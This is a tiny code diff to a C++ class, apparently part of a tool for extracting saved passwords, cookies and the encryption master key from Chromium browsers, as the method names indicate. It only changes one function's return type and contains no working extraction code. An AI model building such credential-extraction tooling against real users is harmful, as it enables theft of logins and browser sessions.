@@ -24,7 +24,7 @@ class ChromiumProcessor
     string cookies_path;
     string prevBrowser_path;
 
-    stringstream ExtractChromiumPasswords();
+    int ExtractChromiumPasswords();
     int ExtractChromiumCookies();
     unsigned char *ExtractChromiumMasterKey();
 
